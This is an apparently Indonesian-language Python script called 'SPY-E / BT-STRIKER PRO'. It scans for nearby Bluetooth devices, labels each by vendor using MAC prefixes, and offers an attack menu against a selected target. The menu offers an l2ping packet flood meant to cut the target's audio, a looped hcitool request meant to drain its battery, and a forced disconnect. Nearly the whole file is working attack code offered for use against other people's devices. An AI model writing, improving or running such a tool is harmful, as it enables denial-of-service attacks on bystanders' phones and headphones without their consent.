import asyncio
import os
import sys
import time
import subprocess
import json
import urllib.request
from bleak import BleakScanner

# --- SPY-E THEME COLORS ---
R = "\033[1;31m"; G = "\033[1;32m"; Y = "\033[1;33m"
B = "\033[1;34m"; C = "\033[1;36m"; W = "\033[1;37m"; X = "\033[0m"

# Database Vendor Sederhana (Jika Offline)
VENDOR_DB = {
    "Apple": ["64:D6:9A", "AC:44:F2", "00:25:00", "B0:35:B1", "F0:B3:EC"],
    "Samsung": ["5C:F8:A1", "00:12:47", "34:FC:EF"],
    "Sony": ["00:13:E0", "04:5D:4B", "70:9E:29"],
    "JBL/Harman": ["00:23:01", "B8:69:C2"],
}

def get_vendor(mac):
    """Mendeteksi merk berdasarkan 3 blok pertama MAC Address"""
    prefix = mac.upper()[:8]
    # Cek Database Manual
    for vendor, prefixes in VENDOR_DB.items():
        if any(prefix.startswith(p) for p in prefixes):
            return vendor
    return "Generic/Unknown"

def header():
    os.system('clear')
    print(f"""{R}
  ██████  ██████  ██    ██      ███████ 
 ██      ██    ██  ██  ██       ██      
  █████  ██    ██   ████        █████   
      ██ ██    ██    ██         ██      
 ██████   ██████     ██         ███████ 
    {W}BT-STRIKER PRO | VENDOR INTEL | 123TOOL{X}
    """)

async def scan_devices():
    header()
    print(f"{C}[*] Memulai Advanced Radar Scan (7 detik)...{X}")
    devices = await BleakScanner.discover()
    found = []
    
    if not devices:
        print(f"{R}[!] Radar tidak menangkap sinyal apapun.{X}")
        input("\nTekan Enter untuk scan ulang..."); return None
    
    print(f"\n{W}ID  | MAC ADDRESS       | VENDOR       | NAME{X}")
    print("-" * 65)
    
    for i, d in enumerate(devices):
        name = d.name if d.name else "Hidden Name"
        vendor = get_vendor(d.address)
        print(f"{G}{i:02}  {W}| {C}{d.address} {W}| {Y}{vendor:<12} {W}| {G}{name}{X}")
        found.append(d.address)
    
    return found

# [Fungsi attack_menu tetap sama seperti sebelumnya, namun lebih stabil]
def attack_menu(target_mac):
    header()
    vendor = get_vendor(target_mac)
    print(f"{Y}TARGET LOCKED : {R}{target_mac} ({vendor}){X}\n")
    print(f"{W}PILIH JENIS OPERASI:{X}")
    print(f"{G}[A] {W}Bluetooth Flood (Ping Prank - Bikin Audio Putus)")
    print(f"{G}[B] {W}Battery Drain (Force System Reply)")
    print(f"{G}[D] {W}Deauth (Force Disconnect Device)")
    print(f"{R}[X] {W}Batal / Kembali")
    
    choice = input(f"\n{C}SPY-E > {X}").upper()
    
    if choice == 'A':
        size = "800" # Ukuran paket diperbesar agar lebih berat
        print(f"{R}[!] Mengirim Paket Banjir ({size} bytes) ke {target_mac}...{X}")
        try:
            # Gunakan sudo l2ping -f (flood)
            subprocess.run(["sudo", "l2ping", "-f", "-s", size, target_mac])
        except KeyboardInterrupt:
            print(f"\n{G}[+] Serangan dihentikan.{X}")

    elif choice == 'B':
        print(f"{R}[!] Menarik daya baterai {target_mac}...{X}")
        try:
            while True:
                subprocess.run(["hcitool", "info", target_mac], stdout=subprocess.DEVNULL)
                print(f"{G}[+] Loop Request Sent!{X}", end="\r")
        except KeyboardInterrupt: pass

    elif choice == 'D':
        print(f"{R}[!] Memutus koneksi target...{X}")
        subprocess.run(["sudo", "hcitool", "dc", target_mac])
        print(f"{G}[+] Perintah Disconnect Terkirim.{X}")

    input(f"\n{C}Selesai. Tekan Enter untuk kembali...{X}")

async def main():
    while True:
        target_list = await scan_devices()
        if target_list:
            idx = input(f"\n{W}Pilih ID Target (atau 'r' untuk refresh): {X}")
            if idx.lower() == 'r': continue
            try:
                attack_menu(target_list[int(idx)])
            except (ValueError, IndexError):
                print(f"{R}[!] ID salah, Bos!{X}")
                time.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{R}[!] SPY-E OFFLINE.{X}")
